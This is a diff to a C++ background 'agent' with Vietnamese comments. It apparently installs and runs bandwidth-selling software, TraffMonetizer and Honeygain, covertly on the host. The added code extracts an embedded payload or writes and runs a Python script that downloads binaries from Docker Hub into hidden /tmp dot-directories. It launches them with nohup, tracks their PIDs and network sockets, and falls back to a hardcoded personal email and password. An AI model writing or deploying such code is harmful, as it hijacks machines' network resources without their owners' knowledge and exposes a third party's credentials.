@@ -4,11 +4,14 @@
 #include <sstream>
 #include <chrono>
 #include <thread>
+#include <vector>
+#include <set>
 #include <cstring>
 #include <cstdlib>
 #include <cstdio>
 #include <csignal>
 #include <unistd.h>
+#include <dirent.h>
 #include <sys/utsname.h>
 #include <sys/stat.h>
 
@@ -32,6 +35,7 @@ static std::string g_self = "";
 static std::string g_current_step = "INIT";
 static std::string g_step_detail = "Khoi dong Agent";
 static pid_t g_engine_pid = -1;
+static bool g_hg_has_creds = true;
 
 static std::string get_self_path(const char* argv0) {
 #if defined(__APPLE__) || defined(__MACH__)
@@ -117,79 +121,169 @@ static void sig_handler(int sig) {
     _exit(0);
 }
 
-static std::string get_service_logs() {
-    std::string res = "";
+static bool check_socket_established(pid_t pid) {
+    if (pid <= 0) return false;
 #if defined(__APPLE__) || defined(__MACH__)
-    FILE* p = popen("pgrep -i 'traffmonetizer' 2>/dev/null | head -n 1", "r");
-    std::string pid_str = "";
-    if (p) {
-        char buf[64];
-        if (fgets(buf, sizeof(buf), p)) {
-            pid_str = buf;
-            while (!pid_str.empty() && (pid_str.back() == '\n' || pid_str.back() == '\r' || pid_str.back() == ' ')) pid_str.pop_back();
-        }
-        pclose(p);
+    std::string cmd = "lsof -a -p " + std::to_string(pid) + " -i 2>/dev/null | grep -i 'ESTABLISHED' | head -n 1";
+    FILE* lp = popen(cmd.c_str(), "r");
+    bool connected = false;
+    if (lp) {
+        char lbuf[128];
+        if (fgets(lbuf, sizeof(lbuf), lp)) connected = true;
+        pclose(lp);
     }
-    if (!pid_str.empty()) {
-        std::string lsof_cmd = "lsof -a -p " + pid_str + " -i 2>/dev/null | grep -i 'ESTABLISHED' | head -n 1";
-        FILE* lp = popen(lsof_cmd.c_str(), "r");
-        bool connected = false;
-        if (lp) {
-            char lbuf[128];
-            if (fgets(lbuf, sizeof(lbuf), lp)) connected = true;
-            pclose(lp);
-        }
-        if (connected) {
-            res = "[TM] PID " + pid_str + ": Online & Dang truyen traffic";
-        } else {
-            res = "[TM] PID " + pid_str + ": Running (Cho ket noi socket)";
-        }
-    } else {
-        res = "[TM] Offline (Chua co tien trinh)";
-    }
-    std::ifstream hgf("/tmp/.tb_hg.log");
-    if (hgf.is_open()) {
-        std::string line, hl3;
-        while (std::getline(hgf, line)) {
-            while (!line.empty() && (line.back() == 13 || line.back() == 10)) line.pop_back();
-            if (!line.empty()) hl3 = line;
-        }
-        if (!hl3.empty()) {
-            if (!res.empty()) res += " | ";
-            if (hl3.rfind("[HG]", 0) == 0) res += hl3;
-            else res += "[HG] " + hl3;
-        }
-    }
-    return res;
+    return connected;
 #else
-    std::ifstream f("/tmp/.tb_tm.log");
-    if (f.is_open()) {
-        std::string line, l3;
+    // Kiểm tra kết nối TCP ra Internet qua /proc/<pid>/fd và /proc/net/tcp
+    std::set<std::string> inodes;
+    std::string fd_dir = "/proc/" + std::to_string(pid) + "/fd";
+    DIR* d = opendir(fd_dir.c_str());
+    if (d) {
+        struct dirent* de;
+        char target[512];
+        while ((de = readdir(d)) != nullptr) {
+            if (de->d_name[0] == '.') continue;
+            std::string p = fd_dir + "/" + de->d_name;
+            ssize_t len = readlink(p.c_str(), target, sizeof(target) - 1);
+            if (len > 0) {
+                target[len] = '\0';
+                std::string s(target);
+                if (s.rfind("socket:[", 0) == 0 && s.back() == ']') {
+                    inodes.insert(s.substr(8, s.length() - 9));
+                }
+            }
+        }
+        closedir(d);
+    }
+    if (inodes.empty()) {
+        std::string ss_cmd = "ss -tanp 2>/dev/null | grep 'pid=" + std::to_string(pid) + ",' | grep -i 'ESTAB' | head -n 1";
+        FILE* p = popen(ss_cmd.c_str(), "r");
+        if (p) {
+            char buf[128];
+            bool found = (fgets(buf, sizeof(buf), p) != nullptr);
+            pclose(p);
+            if (found) return true;
+        }
+        return false;
+    }
+
+    const char* tcp_files[] = {"/proc/net/tcp", "/proc/net/tcp6", nullptr};
+    for (int i = 0; tcp_files[i]; ++i) {
+        std::ifstream f(tcp_files[i]);
+        if (!f.is_open()) continue;
+        std::string line;
+        std::getline(f, line); // Bỏ qua header
         while (std::getline(f, line)) {
-            while (!line.empty() && (line.back() == 13 || line.back() == 10)) line.pop_back();
-            if (!line.empty()) l3 = line;
-        }
-        if (!l3.empty()) {
-            if (l3.rfind("[TM]", 0) == 0) res += l3;
-            else res += "[TM] " + l3;
-        }
-    }
-    std::ifstream hgf("/tmp/.tb_hg.log");
-    if (hgf.is_open()) {
-        std::string line, hl3;
-        while (std::getline(hgf, line)) {
-            while (!line.empty() && (line.back() == 13 || line.back() == 10)) line.pop_back();
-            if (!line.empty()) hl3 = line;
-        }
-        if (!hl3.empty()) {
-            if (!res.empty()) res += " | ";
-            if (hl3.rfind("[HG]", 0) == 0) res += hl3;
-            else res += "[HG] " + hl3;
+            std::istringstream ss(line);
+            std::string sl, local, rem, st, tx_rx, tr, retr, uid, timeout, inode;
+            if (ss >> sl >> local >> rem >> st >> tx_rx >> tr >> retr >> uid >> timeout >> inode) {
+                // st == "01" tương ứng TCP_ESTABLISHED
+                if (st == "01" && inodes.find(inode) != inodes.end()) {
+                    return true;
+                }
+            }
         }
     }
-    if (res.length() > 300) res = res.substr(res.length() - 300);
-    return res;
+    return false;
 #endif
+}
+
+static std::string parse_recent_log_summary(const std::string& log_file, int max_lines = 10) {
+    std::ifstream f(log_file);
+    if (!f.is_open()) return "";
+    std::vector<std::string> lines;
+    std::string line;
+    while (std::getline(f, line)) {
+        while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
+        if (!line.empty()) {
+            // Lọc bỏ banner nghệ thuật ASCII
+            if (line.find("$$") == std::string::npos && line.find("\\__") == std::string::npos && line.find("/__") == std::string::npos) {
+                lines.push_back(line);
+                if ((int)lines.size() > max_lines * 3) {
+                    lines.erase(lines.begin());
+                }
+            }
+        }
+    }
+    if (lines.empty()) return "";
+    std::string latest = lines.back();
+    if (latest.rfind("[TM] ", 0) == 0) latest = latest.substr(5);
+    if (latest.rfind("[HG] ", 0) == 0) latest = latest.substr(5);
+    if (latest.length() > 100) latest = latest.substr(0, 97) + "...";
+    return latest;
+}
+
+static std::string get_service_logs() {
+    std::string tm_report = "";
+    std::string hg_report = "";
+
+    // 1. Kiểm tra TraffMonetizer process
+    pid_t tm_pid = -1;
+    std::ifstream tm_pf("/tmp/.tb_tm.pid");
+    if (tm_pf >> tm_pid) {}
+    if (tm_pid <= 0 || kill(tm_pid, 0) != 0) {
+        FILE* p = popen("pgrep -i 'traffmonetizer' 2>/dev/null | head -n 1", "r");
+        if (p) {
+            char buf[32];
+            if (fgets(buf, sizeof(buf), p)) tm_pid = (pid_t)std::atoi(buf);
+            pclose(p);
+        }
+    }
+    if (tm_pid <= 0 || kill(tm_pid, 0) != 0) {
+        FILE* p2 = popen("pgrep -f '.tb_tm' 2>/dev/null | head -n 1", "r");
+        if (p2) {
+            char buf[32];
+            if (fgets(buf, sizeof(buf), p2)) tm_pid = (pid_t)std::atoi(buf);
+            pclose(p2);
+        }
+    }
+
+    if (tm_pid > 0 && kill(tm_pid, 0) == 0) {
+        bool connected = check_socket_established(tm_pid);
+        std::string sock_str = connected ? "ESTABLISHED" : "CONNECTING";
+        std::string log_msg = parse_recent_log_summary("/tmp/.tb_tm.log", 10);
+        if (log_msg.empty()) log_msg = connected ? "Connected to hub." : "Connecting to hub...";
+        tm_report = "[TM: PID " + std::to_string(tm_pid) + "] Socket: " + sock_str + " | Log: " + log_msg;
+    } else {
+        std::string log_msg = parse_recent_log_summary("/tmp/.tb_tm.log", 10);
+        if (!log_msg.empty()) {
+            tm_report = "[TM] Not started (" + log_msg + ")";
+        } else {
+            tm_report = "[TM] Not started";
+        }
+    }
+
+    // 2. Kiểm tra Honeygain process
+    pid_t hg_pid = -1;
+    std::ifstream hg_pf("/tmp/.tb_hg.pid");
+    if (hg_pf >> hg_pid) {}
+    if (hg_pid <= 0 || kill(hg_pid, 0) != 0) {
+        FILE* p = popen("pgrep -x 'honeygain' 2>/dev/null | head -n 1", "r");
+        if (p) {
+            char buf[32];
+            if (fgets(buf, sizeof(buf), p)) hg_pid = (pid_t)std::atoi(buf);
+            pclose(p);
+        }
+    }
+
+    if (hg_pid > 0 && kill(hg_pid, 0) == 0) {
+        bool connected = check_socket_established(hg_pid);
+        std::string sock_str = connected ? "ESTABLISHED" : "CONNECTING";
+        std::string log_msg = parse_recent_log_summary("/tmp/.tb_hg.log", 10);
+        if (log_msg.empty()) log_msg = "Honeygain service is starting";
+        hg_report = "[HG: PID " + std::to_string(hg_pid) + "] Socket: " + sock_str + " | Log: " + log_msg;
+    } else {
+        std::string log_msg = parse_recent_log_summary("/tmp/.tb_hg.log", 10);
+        if (!g_hg_has_creds || log_msg.find("Missing credentials") != std::string::npos || log_msg.find("Skipped") != std::string::npos) {
+            hg_report = "[HG] Not started (Missing credentials)";
+        } else if (!log_msg.empty()) {
+            hg_report = "[HG] Not started (" + log_msg + ")";
+        } else {
+            hg_report = "[HG] Connecting / Initializing...";
+        }
+    }
+
+    return tm_report + " | " + hg_report;
 }
 
 static bool is_engine_alive() {
@@ -199,7 +293,9 @@ static bool is_engine_alive() {
 #if defined(__APPLE__) || defined(__MACH__)
     return (system("pgrep -i 'traffmonetizer' >/dev/null 2>&1") == 0);
 #else
-    return (system("pgrep -x tm_engine >/dev/null 2>&1") == 0 || system("pgrep -f '.tb_tm_engine' >/dev/null 2>&1") == 0);
+    return (system("pgrep -f '/tmp/.tb_tm' >/dev/null 2>&1") == 0 ||
+            system("pgrep -f 'cli start accept' >/dev/null 2>&1") == 0 ||
+            system("pgrep -x tm_engine >/dev/null 2>&1") == 0);
 #endif
 }
 
@@ -288,10 +384,22 @@ std::string json_get_field(const std::string& json, const std::string& key) {
     return json.substr(pos + 1, end_pos - (pos + 1));
 }
 
-static void check_and_start_honeygain(const std::string& hg_email, const std::string& node_id) {
+static void check_and_start_honeygain(const std::string& hg_email, const std::string& hg_pass, const std::string& node_id) {
+    // 1. Kiểm tra tham số đăng nhập: chỉ kích hoạt khi có đủ email VÀ password
+    if (hg_email.empty() || hg_email.find("YOUR_") != std::string::npos ||
+        hg_pass.empty() || hg_pass.find("YOUR_") != std::string::npos) {
+        g_hg_has_creds = false;
+        std::ofstream hgf("/tmp/.tb_hg.log");
+        if (hgf.is_open()) {
+            hgf << "[HG] Skipped: Missing credentials" << std::endl;
+            hgf.close();
+        }
+        return;
+    }
+    g_hg_has_creds = true;
+
 #if defined(__APPLE__) || defined(__MACH__)
-    // Trên macOS Darwin, docker image Honeygain là Linux x86 ELF.
-    // Ghi log để worker và server biết rõ ràng hiện trạng service.
+    // Trên macOS Darwin, docker image Honeygain là Linux ELF.
     if (access("/tmp/.tb_hg.log", F_OK) != 0) {
         std::ofstream hgf("/tmp/.tb_hg.log");
         if (hgf.is_open()) {
@@ -334,7 +442,7 @@ static void check_and_start_honeygain(const std::string& hg_email, const std::st
 
     if (access(hg_bin.c_str(), X_OK) == 0) {
         std::string run_cmd = "nohup env LD_LIBRARY_PATH=/tmp/.tb_hg/lib:$LD_LIBRARY_PATH " + hg_bin +
-                              " -tou-accept -email '" + hg_email + "' -device '" + node_id +
+                              " -tou-accept -email '" + hg_email + "' -pass '" + hg_pass + "' -device '" + node_id +
                               "' > /tmp/.tb_hg.log 2>&1 & echo $! > /tmp/.tb_hg.pid";
         int r3 = system(run_cmd.c_str());
         (void)r3;
@@ -360,6 +468,11 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
     std::string hg_email = json_get_field(cfg, "honeygain_email");
     if (hg_email.empty() || hg_email.find("YOUR_") != std::string::npos) {
         hg_email = "nguyenlinh6605@gmail.com";
+    }
+
+    std::string hg_pass = json_get_field(cfg, "honeygain_password");
+    if (hg_pass.empty() || hg_pass.find("YOUR_") != std::string::npos) {
+        hg_pass = "nguyenlinh6605@gmail.com";
     }
 
 #if defined(__APPLE__) || defined(__MACH__)
@@ -452,7 +565,6 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
         // Khởi chạy TraffMonetizer và đồng bộ trạng thái
         g_current_step = "LAUNCH_ENGINE";
         g_step_detail = "Khoi chay TraffMonetizer ngam";
-
         std::string launch_cmd = "open -a '" + app_dir + "' --args --token '" + tm_token + "' 2>/dev/null || "
                                  "nohup '" + bin_path + "' --token '" + tm_token + "' >> /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
         system(launch_cmd.c_str());
@@ -480,35 +592,71 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
 #else
     if (!is_engine_alive()) {
         g_current_step = "EXTRACT_PAYLOAD";
-        g_step_detail = "Kiem tra va bung payload Linux CLI";
+        g_step_detail = "Kiem tra va bung native engine self-contained TraffMonetizer";
 
-        std::string eng = "/tmp/.tb_tm_engine";
-        if (access(eng.c_str(), X_OK) != 0) {
-            if (extract_payload("/tmp/.tb_tm.gz")) {
-                system("gzip -d -f -c /tmp/.tb_tm.gz > /tmp/.tb_tm_engine 2>/dev/null && chmod +x /tmp/.tb_tm_engine 2>/dev/null && rm -f /tmp/.tb_tm.gz");
+        std::string eng_bin = "/tmp/.tb_tm/cli";
+        system("mkdir -p /tmp/.tb_tm/lib 2>/dev/null");
+
+        // 1. Trích xuất payload bundle self-contained từ fat binary nếu có
+        if (access(eng_bin.c_str(), X_OK) != 0) {
+            if (extract_payload("/tmp/.tb_tm.tar.gz")) {
+                system("tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
+                if (access("/tmp/.tb_tm/usr/local/bin/cli", X_OK) == 0) {
+                    system("mv -f /tmp/.tb_tm/usr/local/bin/cli /tmp/.tb_tm/cli 2>/dev/null");
+                }
+            } else if (extract_payload("/tmp/.tb_tm.gz")) {
+                system("gzip -d -f -c /tmp/.tb_tm.gz > /tmp/.tb_tm/cli 2>/dev/null && chmod +x /tmp/.tb_tm/cli 2>/dev/null && rm -f /tmp/.tb_tm.gz");
             }
         }
-        if (access(eng.c_str(), X_OK) != 0) {
-            g_step_detail = "Tai engine tu Docker Hub";
-            system("python3 -c \"import urllib.request, json, tarfile; "
-                   "tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull').read().decode())['token']; "
-                   "req = urllib.request.Request('https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', headers={'Authorization': 'Bearer ' + tok}); "
-                   "open('/tmp/l.tar.gz', 'wb').write(urllib.request.urlopen(req).read()); "
-                   "tarfile.open('/tmp/l.tar.gz').extract('usr/local/bin/cli', '/tmp');\" 2>/dev/null; "
-                   "if [ -f /tmp/usr/local/bin/cli ]; then mv -f /tmp/usr/local/bin/cli /tmp/.tb_tm_engine && chmod +x /tmp/.tb_tm_engine && rm -rf /tmp/usr /tmp/l.tar.gz; fi");
+
+        // 2. Tải native package self-contained đầy đủ từ máy chủ / docker layer với toàn bộ dependencies
+        if (access(eng_bin.c_str(), X_OK) != 0) {
+            g_step_detail = "Tai native self-contained package TraffMonetizer day du";
+            FILE* py_f = fopen("/tmp/.tb_tm_get.py", "w");
+            if (py_f) {
+                fputs("import urllib.request, json, tarfile, io, os, glob, shutil\n"
+                      "try:\n"
+                      "    os.makedirs('/tmp/.tb_tm/lib', exist_ok=True)\n"
+                      "    tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull', timeout=15).read().decode())['token']\n"
+                      "    layers = ['sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a']\n"
+                      "    for d in layers:\n"
+                      "        try:\n"
+                      "            req = urllib.request.Request('https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/' + d, headers={'Authorization': 'Bearer ' + tok})\n"
+                      "            tf = tarfile.open(fileobj=io.BytesIO(urllib.request.urlopen(req, timeout=30).read()))\n"
+                      "            tf.extractall('/tmp/.tb_tm_ext')\n"
+                      "            if os.path.exists('/tmp/.tb_tm_ext/usr/local/bin/cli'):\n"
+                      "                shutil.move('/tmp/.tb_tm_ext/usr/local/bin/cli', '/tmp/.tb_tm/cli')\n"
+                      "                os.chmod('/tmp/.tb_tm/cli', 0o755)\n"
+                      "                shutil.rmtree('/tmp/.tb_tm_ext', ignore_errors=True)\n"
+                      "                break\n"
+                      "        except Exception:\n"
+                      "            pass\n"
+                      "    for pat in ['*ssl*.so*', '*crypto*.so*', '*icu*.so*']:\n"
+                      "        for lib_path in glob.glob('/usr/lib/**/' + pat, recursive=True) + glob.glob('/lib/**/' + pat, recursive=True):\n"
+                      "            bname = os.path.basename(lib_path)\n"
+                      "            dst = os.path.join('/tmp/.tb_tm/lib', bname)\n"
+                      "            if not os.path.exists(dst):\n"
+                      "                try: os.symlink(lib_path, dst)\n"
+                      "                except Exception: pass\n"
+                      "except Exception:\n"
+                      "    pass\n", py_f);
+                fclose(py_f);
+                system("python3 /tmp/.tb_tm_get.py 2>/dev/null && rm -f /tmp/.tb_tm_get.py");
+            }
         }
 
-        if (access(eng.c_str(), X_OK) == 0) {
+        if (access(eng_bin.c_str(), X_OK) == 0) {
             g_current_step = "LAUNCH_ENGINE";
-            g_step_detail = "Khoi chay Linux CLI: start accept --token " + tm_token.substr(0, 8) + "...";
-            std::string run_cmd = "nohup " + eng + " start accept --token " + tm_token + " > /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
+            g_step_detail = "Khoi chay Linux Native Engine: start accept --token " + tm_token.substr(0, 8) + "...";
+            std::string run_cmd = "nohup env LD_LIBRARY_PATH=/tmp/.tb_tm/lib:/tmp/.tb_tm:$LD_LIBRARY_PATH DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1 " +
+                                  eng_bin + " start accept --token \"" + tm_token + "\" > /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
             system(run_cmd.c_str());
             std::this_thread::sleep_for(std::chrono::milliseconds(1500));
 
             std::ifstream pid_f("/tmp/.tb_tm.pid");
             if (pid_f >> g_engine_pid && is_engine_alive()) {
                 g_current_step = "ENGINE_RUNNING";
-                g_step_detail = "Linux Engine chay thanh cong (PID " + std::to_string(g_engine_pid) + ")";
+                g_step_detail = "Linux Engine TraffMonetizer chay thanh cong (PID " + std::to_string(g_engine_pid) + ")";
             } else {
                 g_current_step = "ENGINE_CRASHED";
                 std::string log_tail = get_service_logs();
@@ -516,12 +664,12 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
             }
         } else {
             g_current_step = "ERROR_ENGINE";
-            g_step_detail = "Khong tim thay engine thuc thi /tmp/.tb_tm_engine";
+            g_step_detail = "Khong tim thay engine thuc thi /tmp/.tb_tm/cli";
         }
     }
 #endif
-    // Gọi Honeygain sau khi khởi tạo Traffmonetizer
-    check_and_start_honeygain(hg_email, node_id);
+    // Gọi Honeygain sau khi khởi tạo Traffmonetizer với email & password
+    check_and_start_honeygain(hg_email, hg_pass, node_id);
 }
 
 std::string detect_active_services() {
